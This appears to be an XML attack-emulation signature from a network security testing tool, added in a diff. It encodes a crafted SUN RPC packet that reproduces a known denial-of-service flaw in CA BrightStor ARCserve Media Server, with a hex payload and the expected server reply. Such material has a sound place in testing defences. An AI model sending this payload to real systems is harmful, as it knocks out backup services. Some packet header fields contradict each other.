@@ -1,0 +1,94 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="CA BrightStor ARCserve Backup Media Server SUN RPC Denial of Service (IPv6 Version)"/>
+    <EngDesc display="true" value="There exists a denial of service vulnerability in CA BrightStor ARCserve Media Server. The vulnerability is due to insufficient boundary checking when processing crafted strings supplied in SUN RPC requests. Successful exploitation of this vulnerability allows a remote unauthenticated attacker to terminate the affected service, causing denial of service condition. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="MEMORY_CORRUPTION"/>
+    </Intent>
+    <Protocol display="true" value="STARTRON/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="CA"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="CA_CA_BrightStor_ARCserve_Backup"/>
+      <item value="CA_CA_BrightStor_Enterprise_Backup"/>
+      <item value="CA_CA_Protection_Suite"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="CA_BrightStor_ARCserve_Backup_v9.01"/>
+      <item value="CA_BrightStor_ARCserve_Backup_r11.0"/>
+      <item value="CA_BrightStor_ARCserve_Backup_r11.1"/>
+      <item value="CA_BrightStor_ARCserve_Backup_r11.5"/>
+      <item value="CA_BrightStor_Enterprise_Backup_r10.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20070424-19"/>
+    <CVEID display="true" value="CVE-2007-2139"/>
+    <bugtraqID display="true" value="23635"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="65fc368c5b4f1894b873af34d554d526"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="1225900737"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1216321138" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="Q"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="R"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="S"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="T"/>
+    <NamedVar name="STARTRONdestPort" type="ImperfectControls.Port" value="null" index="U"/>
+  </Variables>
+  <Loops>
+    <for index="M">
+      <for index="Q"/>
+      <for index="R"/>
+      <for index="S"/>
+      <for index="T"/>
+      <for index="U"/>
+    </for>
+    <for index="O"/>
+  </Loops>
+  <PostScript/>
+  <Output index="M" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026,65535)" destPort="$STARTRONdestPort" SeqNumber="0FCD15C6" AckNumber="2B1D2AEE" HeaderLength="08" WindowSize="05B4" Checksum="4FFB" UrgentPointer="0000" Options="0101080A121762A200000000" Payload="8000004865CF4C7B00000000000000020006097E00000001000000ED000000000000000000000000000000000000000000000000000000105F5F616161616161616161616161616100000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="O" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="2B1D2AEE" AckNumber="0FCD1613" HeaderLength="08" WindowSize="FFB3" Checksum="99BB" UrgentPointer="0000" Options="0101080A00000267121762A2" Payload="20" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
